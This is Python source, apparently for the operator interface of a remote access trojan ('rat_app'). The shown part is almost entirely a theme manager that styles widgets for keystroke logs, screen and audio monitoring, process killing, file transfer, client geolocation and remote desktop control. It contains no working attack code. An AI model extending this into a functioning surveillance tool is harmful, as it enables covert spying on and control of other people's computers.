import socket
import threading
import time
import struct
import os
import random
import io
import zlib
import cv2
import numpy as np
import pyaudio
from PIL import ImageGrab, Image
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog, simpledialog
import customtkinter as ctk
from typing import Dict, List, Tuple, Optional
import json
import tempfile
import pynput
import shutil
import uuid
import subprocess
import sys
import matplotlib.dates as mdates
from datetime import datetime
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from collections import deque
import collections
import re
import hashlib
import csv
import select
import asyncio
import concurrent.futures
import functools
import psutil
import queue
import colorsys


THEMES = {
    "Dark": {
        "bg_color": "#121212",            # Deep black for a clean, high-tech background
        "fg_color": "#00E5FF",            # Neon cyan text (futuristic and techy)
        "accent_color": "#00E5FF",        # Electric green accent for a glowing effect
        "secondary_color": "#1A1A1D",     # Dark metallic gray for secondary areas
        "success_color": "#00C853",       # Bright green for success (AI confirmation)
        "danger_color": "#FF3D00",        # Bright orange-red for danger (urgent warnings)
        "warning_color": "#FFB300",       # Bold amber for warnings (emergency signals)
        "info_color": "#1976D2",          # Bright blue for info (AI alerts or feedback)
        "button_color": "#212121",        # Dark charcoal for buttons (sleek and professional)
        "card_color": "#1C1C1C",          # Very dark gray for card backgrounds (subtle yet elegant)
        "hover_color": "#2C2F34",         # Slightly lighter hover effect (soft highlight)
        "border_color": "#00E5FF",        # Cyan borders to complement the neon accents
        "input_bg": "#181818",            # Dark gray background for input fields (minimalist)
        "shadow_color": "rgba(0, 229, 255, 0.2)",  # Soft cyan shadow to add depth and glow
        "latency_excellent": "#00FFAB",   # Electric green for excellent latency (<50ms)
        "latency_good": "#1976D2",        # Bright blue for good latency (<100ms)
        "latency_medium": "#FFB300",      # Bold amber for mediocre latency (<200ms)
        "latency_poor": "#FF3D00"         # Bright orange-red for poor latency (>=200ms)
    }
}



# Add custom fonts
FONT_STYLES = {
    "heading": ("Segoe UI", 18, "bold"),  # Modern sans-serif font
    "subheading": ("Segoe UI", 14, "bold"),
    "normal": ("Segoe UI", 11),  # Highly readable sans-serif
    "small": ("Segoe UI", 9),  # Smaller text for secondary information
    "monospace": ("Segoe UI", 11),  # Developer-friendly monospace
    "status": ("Segoe UI", 11, "bold")
}




class ThemeManager:
    """A centralized theme manager for handling theme changes across all widgets."""
    
    def __init__(self, rat_app, themes):
        self.rat_app = rat_app
        self.themes = themes
        self.tracked_widgets = []
        self.tracked_treeviews = []
        self.tracked_notebooks = []
        self.tracked_menu = []
        self.tracked_labels = []
        self.tracked_scrolledtext = []
        
    def track_widget(self, widget, widget_type="regular"):
        """Track a widget for theme updates."""
        if widget is None:
            return
            
        # Store widget based on its type for proper theme application
        if widget_type == "treeview":
            self.tracked_treeviews.append(widget)
        elif widget_type == "notebook":
            self.tracked_notebooks.append(widget)
        elif widget_type == "menu":
            self.tracked_menu.append(widget)
        elif widget_type == "label":
            self.tracked_labels.append(widget)
        elif widget_type == "scrolledtext":
            self.tracked_scrolledtext.append(widget)
        else:
            self.tracked_widgets.append(widget)
    
    def get_color(self, theme_name, color_key):
        """Get a specific color from the current theme."""
        if theme_name in self.themes and color_key in self.themes[theme_name]:
            return self.themes[theme_name][color_key]
        return None
    
    def _get_theme_value(self, theme, key, default=None):
        """Helper method to safely get a theme value with a default fallback."""
        return theme[key] if key in theme else default
    
    def _configure_widget_common(self, widget, theme, is_frame=False):
        """Apply common configurations to most widgets."""
        try:
            if hasattr(widget, "fg_color") and "fg_color" in dir(widget):
                # Use card_color for frames, button_color for other widgets
                color = theme["card_color"] if is_frame else theme["button_color"]
                widget.configure(fg_color=color)
            
            # Apply text color if the widget supports it
            if hasattr(widget, "text_color") and "text_color" in dir(widget):
                widget.configure(text_color=theme["fg_color"])
                
            # Apply border if supported and available in theme
            if "border_color" in theme and hasattr(widget, "border_color"):
                widget.configure(border_color=theme["border_color"], border_width=1)
        except Exception:
            pass

    def _configure_specific_widgets(self, widget, theme):
        """Configure widget-specific attributes based on widget type."""
        try:
            # Handle buttons with different color types
            if isinstance(widget, ctk.CTkButton):
                self._configure_button(widget, theme)
                
            # Handle progress bars
            elif isinstance(widget, ctk.CTkProgressBar):
                self._configure_progress_bar(widget, theme)
                
            # Handle input fields
            elif isinstance(widget, ctk.CTkEntry):
                self._configure_entry(widget, theme)
                
            # Handle checkboxes
            elif isinstance(widget, ctk.CTkCheckBox):
                self._configure_checkbox(widget, theme)
                
            # Handle text boxes
            elif isinstance(widget, ctk.CTkTextbox):
                self._configure_textbox(widget, theme)
                
            # Handle option menus
            elif isinstance(widget, ctk.CTkOptionMenu):
                self._configure_option_menu(widget, theme)
                
            # Handle segmented buttons
            elif isinstance(widget, ctk.CTkSegmentedButton):
                self._configure_segmented_button(widget, theme)
        except Exception:
            pass

    def _configure_button(self, button, theme):
        """Configure a button widget with appropriate colors."""
        # Determine which color to use based on button's current color
        current_color = str(button.cget("fg_color"))
        
        if "danger" in current_color or theme["danger_color"] in current_color:
            button.configure(fg_color=theme["danger_color"])
            # Use black text for better contrast with vibrant danger color
            text_color = "#000000"
        elif "success" in current_color or theme["success_color"] in current_color:
            button.configure(fg_color=theme["success_color"])
            text_color = "#000000"
        elif "accent" in current_color or theme["accent_color"] in current_color:
            button.configure(fg_color=theme["accent_color"])
            text_color = "#000000"  # Black text for better contrast with accent
        else:
            button.configure(fg_color=theme["button_color"])
            text_color = theme["fg_color"]
            
        # Configure hover and text colors
        button.configure(
            hover_color=theme["hover_color"],
            text_color=text_color,
            bg_color=theme["bg_color"] if hasattr(button, "bg_color") else None,
            border_color=theme["border_color"] if "border_color" in theme else None,
            border_width=1 if "border_color" in theme else 0
        )

    def _configure_progress_bar(self, progress_bar, theme):
        """Configure a progress bar widget."""
        progress_bar.configure(
            progress_color=theme["accent_color"],
            fg_color=theme["bg_color"],
            border_color=theme["border_color"] if "border_color" in theme else None,
            border_width=1 if "border_color" in theme else 0
        )

    def _configure_entry(self, entry, theme):
        """Configure an entry widget."""
        entry.configure(
            fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
            text_color=theme["fg_color"],
            border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
            border_width=1
        )

    def _configure_checkbox(self, checkbox, theme):
        """Configure a checkbox widget."""
        checkbox.configure(
            fg_color=theme["accent_color"],
            text_color=theme["fg_color"],
            hover_color=theme["hover_color"],
            border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
            checkbox_height=20,
            checkbox_width=20
        )

    def _configure_textbox(self, textbox, theme):
        """Configure a textbox widget."""
        textbox.configure(
            fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
            text_color=theme["fg_color"],
            border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
            border_width=1
        )

    def _configure_option_menu(self, option_menu, theme):
        """Configure an option menu widget."""
        option_menu.configure(
            fg_color=theme["button_color"],
            button_color=theme["accent_color"],
            button_hover_color=theme["hover_color"],
            dropdown_fg_color=theme["card_color"],
            dropdown_hover_color=theme["hover_color"],
            dropdown_text_color=theme["fg_color"],
            text_color=theme["fg_color"]
        )

    def _configure_segmented_button(self, segmented_button, theme):
        """Configure a segmented button widget."""
        segmented_button.configure(
            fg_color=theme["button_color"],
            selected_color=theme["accent_color"],
            selected_hover_color=theme["hover_color"],
            unselected_color=theme["button_color"],
            unselected_hover_color=theme["hover_color"],
            text_color=theme["fg_color"],
            selected_text_color="#000000"  # Better contrast on accent color
        )

    def _configure_ttk_styles(self, theme):
        """Configure all ttk styles in one place to avoid redundancy."""
        style = ttk.Style()
        
        # Configure notebook styles - consolidated to one place
        style.configure("TNotebook", background=theme["bg_color"], tabmargins=[2, 5, 2, 0])
        style.configure("TNotebook.Tab", 
                        background=theme["button_color"],
                        foreground="#000000",  # Black text for better contrast
                        padding=[10, 2])
        style.map("TNotebook.Tab",
                  background=[("selected", theme["accent_color"])],
                  foreground=[("selected", "#000000")])
        
        # Frame style for notebook backgrounds
        style.configure("TFrame", background=theme["bg_color"])
        
        # Custom notebook style (uses same settings, just a different name)
        style.configure("Custom.TNotebook", background=theme["bg_color"], tabmargins=[2, 5, 2, 0])
        style.configure("Custom.TNotebook.Tab", 
                        background=theme["button_color"],
                        foreground="#000000",
                        padding=[10, 2])
        style.map("Custom.TNotebook.Tab",
                  background=[("selected", theme["accent_color"])],
                  foreground=[("selected", "#000000")])
        
        # Configure Treeview styles
        style.configure("Treeview", 
                        background=theme["card_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        borderwidth=1,
                        highlightthickness=1,
                        relief="flat")
        style.configure("Treeview.Heading",
                        background=theme["button_color"],
                        foreground=theme["fg_color"],
                        relief="flat")
        style.map("Treeview",
                  background=[("selected", theme["accent_color"])],
                  foreground=[("selected", "#000000")])
        
        # Custom Treeview style
        style.configure("Custom.Treeview", 
                        background=theme["card_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        borderwidth=1,
                        relief="flat",
                        highlightthickness=1)
        style.configure("Custom.Treeview.Heading",
                        background=theme["button_color"],
                        foreground=theme["fg_color"],
                        relief="flat")
        style.map("Custom.Treeview",
                  background=[("selected", theme["accent_color"])],
                  foreground=[("selected", "#000000")])
        
        # Configure scrollbar styles
        style.configure("TScrollbar", 
                        background=theme["button_color"],
                        troughcolor=theme["bg_color"],
                        arrowcolor=theme["accent_color"])
        style.configure("Custom.Vertical.TScrollbar", 
                        background=theme["button_color"],
                        troughcolor=theme["bg_color"],
                        arrowcolor=theme["accent_color"])
        style.configure("Custom.Horizontal.TScrollbar", 
                        background=theme["button_color"],
                        troughcolor=theme["bg_color"],
                        arrowcolor=theme["accent_color"])

    def _configure_menu_items(self, theme):
        """Configure all menu items with consistent styling."""
        for menu in self.tracked_menu:
            try:
                menu.configure(
                    bg=theme["card_color"],
                    fg=theme["fg_color"],
                    activebackground=theme["accent_color"],  # Highlight with accent color
                    activeforeground="#000000"  # Black text for better contrast with accent
                )
            except Exception:
                pass

    def _configure_labels(self, theme):
        """Configure all label items with consistent styling."""
        for label in self.tracked_labels:
            try:
                if hasattr(label, "configure") and "background" in dir(label):
                    # Standard tkinter label
                    label.configure(
                        background=theme["bg_color"],
                        foreground=theme["fg_color"]
                    )
                elif hasattr(label, "configure") and "text_color" in dir(label):
                    # CustomTkinter label
                    label.configure(
                        text_color=theme["fg_color"],
                        fg_color=theme["bg_color"]
                    )
            except Exception:
                pass

    def _configure_scrolledtext(self, theme):
        """Configure all scrolledtext widgets with consistent styling."""
        for scrolledtext in self.tracked_scrolledtext:
            try:
                scrolledtext.configure(
                    bg=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                    fg=theme["fg_color"],
                    insertbackground=theme["accent_color"],  # Cursor color
                    selectbackground=theme["accent_color"],  # Selection background
                    selectforeground="#000000"  # Selection text color
                )
            except Exception:
                pass
    
    def _update_process_manager(self, theme):
        """Update process manager components with new theme."""
        if not hasattr(self.rat_app, 'process_manager'):
            return
            
        pm = self.rat_app.process_manager
        
        # Apply treeview style if method exists
        if hasattr(pm, 'apply_treeview_style'):
            pm.apply_treeview_style()
        
        # Update process manager UI elements
        ui_elements = {
            'refresh_btn': {
                'fg_color': theme["button_color"],
                'hover_color': theme["hover_color"],
                'text_color': theme["fg_color"],
                'bg_color': theme["bg_color"]
            },
            'kill_btn': {
                'fg_color': theme["danger_color"],
                'hover_color': theme["hover_color"],
                'text_color': "#000000",  # Better contrast on danger color
                'bg_color': theme["bg_color"]
            },
            'cpu_progress': {
                'progress_color': theme["accent_color"],
                'fg_color': theme["bg_color"],
                'border_color': theme["border_color"] if "border_color" in theme else None
            },
            'mem_progress': {
                'progress_color': theme["info_color"],
                'fg_color': theme["bg_color"],
                'border_color': theme["border_color"] if "border_color" in theme else None
            }
        }
        
        # Apply configurations if elements exist
        for element_name, config in ui_elements.items():
            if hasattr(pm, element_name):
                element = getattr(pm, element_name)
                element.configure(**config)
        
        # Update context menu if it exists
        if hasattr(pm, 'context_menu'):
            pm.context_menu.configure(
                bg=theme["card_color"],
                fg=theme["fg_color"],
                activebackground=theme["accent_color"],
                activeforeground="#000000"
            )
    
    def _update_file_transfer(self, theme):
        """Update file transfer components with new theme."""
        if not hasattr(self.rat_app, 'file_transfer'):
            return
            
        ft = self.rat_app.file_transfer
        
        # Configure card frames with consistent style
        card_frames = ['client_card', 'status_card', 'source_card', 'dest_card', 'info_card']
        for frame_name in card_frames:
            if hasattr(ft, frame_name):
                frame = getattr(ft, frame_name)
                frame.configure(
                    fg_color=theme["card_color"],
                    border_color=theme["border_color"] if "border_color" in theme else None,
                    border_width=1 if "border_color" in theme else 0
                )
        
        # Configure buttons with proper colors
        button_configs = {
            'cancel_btn': {
                'fg_color': theme["danger_color"],
                'hover_color': theme["hover_color"],
                'text_color': "#000000"  # Better contrast with danger color
            },
            'upload_btn': {
                'fg_color': theme["button_color"],
                'hover_color': theme["hover_color"],
                'text_color': theme["fg_color"]
            },
            'download_btn': {
                'fg_color': theme["button_color"],
                'hover_color': theme["hover_color"],
                'text_color': theme["fg_color"]
            }
        }
        
        for btn_name, config in button_configs.items():
            if hasattr(ft, btn_name):
                btn = getattr(ft, btn_name)
                btn.configure(**config)
        
        # Configure progress bar
        if hasattr(ft, 'progress_bar'):
            ft.progress_bar.configure(
                progress_color=theme["accent_color"],
                fg_color=theme["bg_color"],
                border_color=theme["border_color"] if "border_color" in theme else None
            )
        
        # Configure text display
        if hasattr(ft, 'upload_info_text'):
            ft.upload_info_text.configure(
                fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                text_color=theme["fg_color"],
                border_color=theme["border_color"] if "border_color" in theme else None,
                border_width=1 if "border_color" in theme else 0
            )
    
    def _update_sidebar_components(self, theme):
        """Update sidebar components with new theme."""
        if not hasattr(self.rat_app, 'sidebar_components'):
            return
            
        sidebar = self.rat_app.sidebar_components
        
        # Update logo
        if 'logo_label' in sidebar:
            sidebar['logo_label'].configure(text_color=theme["accent_color"])
        
        # Update frames
        for frame_name in ['server_frame', 'theme_frame']:
            if frame_name in sidebar:
                sidebar[frame_name].configure(
                    fg_color=theme["card_color"],
                    border_color=theme["border_color"] if "border_color" in theme else None,
                    border_width=1 if "border_color" in theme else 0
                )
        
        # Update theme selector
        if 'theme_options' in sidebar:
            sidebar['theme_options'].configure(
                fg_color=theme["button_color"],
                button_color=theme["accent_color"],
                button_hover_color=theme["hover_color"],
                dropdown_fg_color=theme["card_color"],
                dropdown_hover_color=theme["hover_color"],
                text_color=theme["fg_color"],
                dropdown_text_color=theme["fg_color"]
            )
        
        # Update server control buttons
        button_configs = {
            'start_server_btn': {
                'fg_color': theme["success_color"],
                'hover_color': theme["hover_color"],
                'text_color': "#000000",
                'border_color': theme["border_color"] if "border_color" in theme else None,
                'border_width': 1 if "border_color" in theme else 0
            },
            'stop_server_btn': {
                'fg_color': theme["danger_color"],
                'hover_color': theme["hover_color"],
                'text_color': "#000000",
                'border_color': theme["border_color"] if "border_color" in theme else None,
                'border_width': 1 if "border_color" in theme else 0
            }
        }
        
        for btn_name, config in button_configs.items():
            if hasattr(self.rat_app, btn_name):
                btn = getattr(self.rat_app, btn_name)
                btn.configure(**config)
    
    def _update_monitoring_tab(self, theme):
        """Update monitoring tab components with new theme."""
        # Update monitoring buttons if method exists
        if hasattr(self.rat_app, 'update_monitoring_buttons'):
            self.rat_app.update_monitoring_buttons()
        
        # Configure display frames and displays
        display_frames = [
            ('screen_display_frame', 'screen_display'),
            ('audio_display_frame', 'audio_display'),
            ('keyboard_log_frame', 'keyboard_log')
        ]
        
        for frame_name, display_name in display_frames:
            # Configure the frame if it exists
            if hasattr(self.rat_app, frame_name):
                frame = getattr(self.rat_app, frame_name)
                frame.configure(
                    fg_color=theme["card_color"],
                    border_color=theme["border_color"] if "border_color" in theme else None,
                    border_width=1 if "border_color" in theme else 0,
                    corner_radius=0
                )
            
            # Configure the display if it exists
            if hasattr(self.rat_app, display_name):
                display = getattr(self.rat_app, display_name)
                
                # Handle different display types
                if display_name == 'keyboard_log':
                    display.configure(
                        background=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                        foreground=theme["fg_color"],
                        highlightbackground=theme["accent_color"],
                        insertbackground=theme["accent_color"]
                    )
                else:
                    display.configure(
                        background=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                        foreground=theme["fg_color"]
                    )
    
    def _update_settings_tab(self, theme):
        """Update settings tab components with new theme."""
        # Update settings buttons if method exists
        if hasattr(self.rat_app, 'update_settings_buttons'):
            self.rat_app.update_settings_buttons()
        
        # Configure sliders
        slider_names = ['screenshot_fps_slider', 'screenshot_slider']
        for slider_name in slider_names:
            if hasattr(self.rat_app, slider_name):
                slider = getattr(self.rat_app, slider_name)
                slider.configure(
                    progress_color=theme["accent_color"],
                    button_color=theme["accent_color"],
                    button_hover_color=theme["hover_color"],
                    fg_color=theme["bg_color"],
                    corner_radius=0
                )
        
        # Configure entries
        entry_names = ['default_ip_entry', 'default_port_entry', 'buffer_entry', 'timeout_entry']
        for entry_name in entry_names:
            if hasattr(self.rat_app, entry_name):
                entry = getattr(self.rat_app, entry_name)
                entry.configure(
                    fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                    text_color=theme["fg_color"],
                    border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                    border_width=1,
                    corner_radius=0
                )
        
        # Configure checkboxes
        checkbox_names = ['autostart_check', 'autosave_check']
        for checkbox_name in checkbox_names:
            if hasattr(self.rat_app, checkbox_name):
                checkbox = getattr(self.rat_app, checkbox_name)
                checkbox.configure(
                    fg_color=theme["accent_color"],
                    border_color=theme["border_color"] if "border_color" in theme else None,
                    border_width=1 if "border_color" in theme else 0,
                    text_color=theme["fg_color"]
                )
    
    def _update_clients_tab(self, theme):
        """Update clients tab components with new theme."""
        # Update client buttons if method exists
        if hasattr(self.rat_app, 'update_clients_buttons'):
            self.rat_app.update_clients_buttons()
        
        # Update clients treeview style
        if hasattr(self.rat_app, 'clients_tree'):
            style = ttk.Style()
            style.configure("Custom.Treeview", 
                        background=theme["card_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        borderwidth=1,
                        relief="flat",
                        highlightthickness=0)
                        
            style.configure("Custom.Treeview.Heading",
                        background=theme["button_color"],
                        foreground=theme["fg_color"],
                        relief="flat")
                        
            style.map("Custom.Treeview",
                    background=[("selected", theme["accent_color"])],
                    foreground=[("selected", "#000000")])
                    
            # Update scrollbar style
            style.configure("Custom.Vertical.TScrollbar", 
                        background=theme["button_color"],
                        troughcolor=theme["bg_color"],
                        arrowcolor=theme["accent_color"])
    
    def _update_geo_mapping(self, theme):
        """Update geo mapping components with new theme."""
        if not hasattr(self.rat_app, 'geo_mapping'):
            return
            
        geo = self.rat_app.geo_mapping
        
        # Update map buttons if method exists
        if hasattr(geo, 'update_map_buttons'):
            geo.update_map_buttons()
        
        # Update text elements
        for text_element_name in ['client_info_text', 'location_info_text', 'log_text']:
            if hasattr(geo, text_element_name):
                text_element = getattr(geo, text_element_name)
                text_element.configure(
                    bg=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                    fg=theme["fg_color"],
                    highlightbackground=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                    insertbackground=theme["accent_color"]
                )
                
                # Configure error tag if it's the log text
                if text_element_name == 'log_text':
                    text_element.tag_configure("error", foreground=theme["danger_color"])
        
        # Update map container
        if hasattr(geo, 'map_container'):
            geo.map_container.configure(
                fg_color=theme["card_color"],
                border_color=theme["border_color"] if "border_color" in theme else None,
                border_width=1 if "border_color" in theme else 0,
                corner_radius=0
            )
            
    def _update_system_info_tab(self, theme):
        """Update system information tab components with new theme."""
        if not hasattr(self.rat_app, 'sysinfo_frame'):
            return
            
        # Update the main frame
        self.rat_app.sysinfo_frame.configure(
            fg_color=theme["card_color"],
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None
        )
        
        # Update button styling
        button_configs = {
            'get_sysinfo_btn': {
                'fg_color': theme["accent_color"],  # Primary action gets accent color
                'hover_color': theme["hover_color"],
                'text_color': "#000000",  # Better contrast on accent color
                'border_color': theme["border_color"] if "border_color" in theme else None,
                'border_width': 1 if "border_color" in theme else 0
            },
            'save_sysinfo_btn': {
                'fg_color': theme["button_color"],  # Secondary action gets button color
                'hover_color': theme["hover_color"],
                'text_color': theme["fg_color"],
                'border_color': theme["border_color"] if "border_color" in theme else None,
                'border_width': 1 if "border_color" in theme else 0
            }
        }
        
        for btn_name, config in button_configs.items():
            if hasattr(self.rat_app, btn_name):
                btn = getattr(self.rat_app, btn_name)
                btn.configure(**config)
        
        # Update client label
        if hasattr(self.rat_app, 'sysinfo_client_label'):
            self.rat_app.sysinfo_client_label.configure(text_color=theme["fg_color"])
            
        # Update "Connected Client:" label if we can find it
        if hasattr(self.rat_app, 'sysinfo_frame'):
            # Try to find the client label through widget hierarchy
            for widget in self.rat_app.sysinfo_frame.winfo_children():
                if isinstance(widget, ctk.CTkFrame):
                    for child in widget.winfo_children():
                        if isinstance(child, ctk.CTkFrame):
                            for label in child.winfo_children():
                                if isinstance(label, ctk.CTkLabel) and "Connected Client" in str(label.cget("text")):
                                    label.configure(text_color=theme["accent_color"])
        
        # Update text displays for system information
        text_displays = [
            'general_info_text',
            'hardware_info_text',
            'software_info_text',
            'users_info_text',
            'startup_info_text'
        ]
        
        for text_name in text_displays:
            if hasattr(self.rat_app, text_name):
                text_widget = getattr(self.rat_app, text_name)
                text_widget.configure(
                    background=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                    foreground=theme["fg_color"],
                    insertbackground=theme["accent_color"],
                    selectbackground=theme["accent_color"],
                    selectforeground="#000000",  # Black text for better contrast on selection
                    highlightcolor=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                    highlightbackground=theme["card_color"]
                )
                
                # Update tag configurations for consistent text styling
                try:
                    text_widget.tag_configure("header", foreground=theme["accent_color"])
                    text_widget.tag_configure("subheader", foreground=theme["info_color"])
                    text_widget.tag_configure("important", foreground=theme["warning_color"])
                    text_widget.tag_configure("value", foreground=theme["fg_color"])
                except Exception:
                    pass  # Tags might not exist yet
                    
    def _update_latency_display(self, rdc, theme):
        """Update the latency display with the appropriate color based on current latency value"""
        if not hasattr(rdc, 'latency_value') or not hasattr(rdc, 'latency_history') or not rdc.latency_history:
            return
            
        avg_latency = sum(rdc.latency_history) / len(rdc.latency_history)
        
        # Color code the latency value based on quality thresholds
        if avg_latency < 50:  # Excellent latency
            latency_color = theme["latency_excellent"] if "latency_excellent" in theme else theme["accent_color"]
        elif avg_latency < 100:  # Good latency
            latency_color = theme["latency_good"] if "latency_good" in theme else theme["info_color"]
        elif avg_latency < 200:  # Medium latency
            latency_color = theme["latency_medium"] if "latency_medium" in theme else theme["warning_color"]
        else:  # Poor latency
            latency_color = theme["latency_poor"] if "latency_poor" in theme else theme["danger_color"]
        
        # Apply the color to the latency value display
        rdc.latency_value.configure(text_color=latency_color)
    
    def _update_remote_desktop_control(self, theme):
        """Update remote desktop control components with new theme."""
        if not hasattr(self.rat_app, 'remote_desktop_control'):
            return
            
        rdc = self.rat_app.remote_desktop_control
        
        # Update main frames
        if hasattr(rdc, 'remote_desktop_frame'):
            rdc.remote_desktop_frame.configure(
                fg_color=theme["bg_color"],
                border_width=1 if "border_color" in theme else 0,
                border_color=theme["border_color"] if "border_color" in theme else None
            )
        
        if hasattr(rdc, 'control_panel'):
            rdc.control_panel.configure(
                fg_color=theme["card_color"],
                border_width=1 if "border_color" in theme else 0,
                border_color=theme["border_color"] if "border_color" in theme else None
            )
        
        if hasattr(rdc, 'screen_frame'):
            rdc.screen_frame.configure(
                fg_color=theme["bg_color"],
                border_width=1 if not rdc.is_controlling else 2,
                border_color=theme["border_color"] if not rdc.is_controlling else theme["accent_color"]
            )
            
            # Update screen label background
            if hasattr(rdc, 'screen_label'):
                rdc.screen_label.configure(bg=theme["bg_color"], fg=theme["fg_color"])
        
        # Update control buttons
        if hasattr(rdc, 'start_control_btn'):
            rdc.start_control_btn.configure(
                fg_color=theme["accent_color"],
                hover_color=theme["hover_color"],
                text_color="#000000",
                border_width=1,
                border_color=theme["border_color"] if "border_color" in theme else None
            )
        
        if hasattr(rdc, 'stop_control_btn'):
            rdc.stop_control_btn.configure(
                fg_color=theme["danger_color"],
                hover_color=theme["hover_color"],
                text_color="#000000",
                border_width=1,
                border_color=theme["border_color"] if "border_color" in theme else None
            )
        
        # Update port entry
        if hasattr(rdc, 'port_entry'):
            rdc.port_entry.configure(
                fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                text_color=theme["fg_color"],
                border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                border_width=1
            )
        
        # Update sliders
        for slider_name in ['quality_slider', 'fps_slider']:
            if hasattr(rdc, slider_name):
                slider = getattr(rdc, slider_name)
                slider.configure(
                    progress_color=theme["accent_color"],
                    button_color=theme["accent_color"],
                    button_hover_color=theme["hover_color"],
                    fg_color=theme["bg_color"]
                )
        
        # Update metrics frame
        if hasattr(rdc, 'metrics_frame'):
            rdc.metrics_frame.configure(
                fg_color=theme["card_color"],
                border_width=1 if "border_color" in theme else 0,
                border_color=theme["border_color"] if "border_color" in theme else None
            )
        
        # Update graph frame and its contents
        if hasattr(rdc, 'graph_frame'):
            rdc.graph_frame.configure(
                fg_color=theme["card_color"],
                border_width=1 if "border_color" in theme else 0,
                border_color=theme["border_color"] if "border_color" in theme else None
            )
            
            # Update graph colors if graph exists
            if hasattr(rdc, 'fig') and hasattr(rdc, 'ax'):
                rdc.fig.patch.set_facecolor(theme["card_color"])
                rdc.ax.set_facecolor(theme["bg_color"])
                
                # Update lines if they exist
                if hasattr(rdc, 'fps_line'):
                    rdc.fps_line.set_color(theme["accent_color"])
                if hasattr(rdc, 'latency_line'):
                    rdc.latency_line.set_color(theme["danger_color"])
                if hasattr(rdc, 'bandwidth_line'):
                    rdc.bandwidth_line.set_color(theme["info_color"])
                    
                # Update grid and title
                rdc.ax.grid(True, color=theme["secondary_color"], linestyle='--', alpha=0.3)
                rdc.ax.set_title("Performance Metrics", color=theme["accent_color"], fontsize=10)
                
                # Force redraw if canvas exists
                if hasattr(rdc, 'canvas'):
                    rdc.canvas.draw_idle()
        
        # Update toggle graph button
        if hasattr(rdc, 'toggle_graph_btn'):
            rdc.toggle_graph_btn.configure(
                fg_color=theme["button_color"],
                hover_color=theme["hover_color"],
                text_color=theme["fg_color"],
                border_width=1 if "border_color" in theme else 0,
                border_color=theme["border_color"] if "border_color" in theme else None
            )
        
        # Update quality indicators
        if hasattr(rdc, 'quality_indicators'):
            quality_level = getattr(rdc, 'connection_quality_level', -1)
            for i, (indicator, color) in enumerate(rdc.quality_indicators):
                # Update inactive color to match theme
                indicator.configure(bg=theme["card_color"])
                
                if i <= quality_level and quality_level >= 0:
                    # Active indicator - use the color from quality_indicators
                    indicator.itemconfig(1, fill=color)
                else:
                    # Inactive indicator
                    indicator.itemconfig(1, fill="#333333")
                    
        # Update labeled values with appropriate colors
        label_configs = {
            'client_info_label': {
                'text_color': theme["fg_color"] if rdc.is_controlling else theme["danger_color"]
            },
            'status_value': {
                'text_color': theme["success_color"] if rdc.is_controlling else theme["danger_color"]
            },
            'quality_value': {
                'text_color': theme["fg_color"]
            },
            'fps_value': {
                'text_color': theme["fg_color"]
            },
            'fps_metric_value': {
                'text_color': theme["fg_color"]
            },
            'bandwidth_value': {
                'text_color': theme["fg_color"]
            }
        }
        
        # Apply label configurations
        for label_name, config in label_configs.items():
            if hasattr(rdc, label_name):
                label = getattr(rdc, label_name)
                label.configure(**config)
        
        # Update quality metric value with current quality level color
        if hasattr(rdc, 'quality_metric_value') and hasattr(rdc, 'quality_indicators') and hasattr(rdc, 'connection_quality_level'):
            quality_level = rdc.connection_quality_level
            if 0 <= quality_level < len(rdc.quality_indicators):
                quality_color = rdc.quality_indicators[quality_level][1]
                rdc.quality_metric_value.configure(text_color=quality_color)
            else:
                rdc.quality_metric_value.configure(text_color=theme["fg_color"])
        
        # Update latency value with appropriate color based on current latency
        self._update_latency_display(rdc, theme)
    
    def apply_theme(self, theme_name):
        """Apply the selected theme to all tracked widgets and components."""
        if theme_name not in self.themes:
            return
            
        theme = self.themes[theme_name]
        
        # Apply theme to the main window
        self.rat_app.root.configure(fg_color=theme["bg_color"], bg_color=theme["bg_color"])
        
        # 1. Configure all ttk styles (notebooks, treeviews, scrollbars)
        self._configure_ttk_styles(theme)
        
        # 2. Apply theme to regular widgets
        for widget in self.tracked_widgets:
            widget_class = widget.__class__.__name__
            
            # Apply common configurations first
            is_frame = isinstance(widget, ctk.CTkFrame)
            self._configure_widget_common(widget, theme, is_frame)
            
            # Then apply widget-specific configurations
            self._configure_specific_widgets(widget, theme)
        
        # 3. Apply theme to special widget types
        self._configure_menu_items(theme)
        self._configure_labels(theme)
        self._configure_scrolledtext(theme)
        
        # 4. Update application-specific components
        self._update_process_manager(theme)
        self._update_file_transfer(theme)
        self._update_sidebar_components(theme)
        self._update_monitoring_tab(theme)
        self._update_settings_tab(theme)
        self._update_clients_tab(theme)
        self._update_geo_mapping(theme)
        self._update_system_info_tab(theme)
        self._update_remote_desktop_control(theme)
        
        # 5. Call additional update methods if they exist
        additional_methods = [
            'update_terminal_colors',
            'update_command_buttons',
            'update_dashboard_theme',
            'update_dashboard_buttons'
        ]
        
        for method_name in additional_methods:
            if hasattr(self.rat_app, method_name):
                method = getattr(self.rat_app, method_name)
                method()
                                             
class ProcessManager:
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.process_list = []
        self.auto_refresh = False
        self.auto_refresh_interval = 5  # seconds
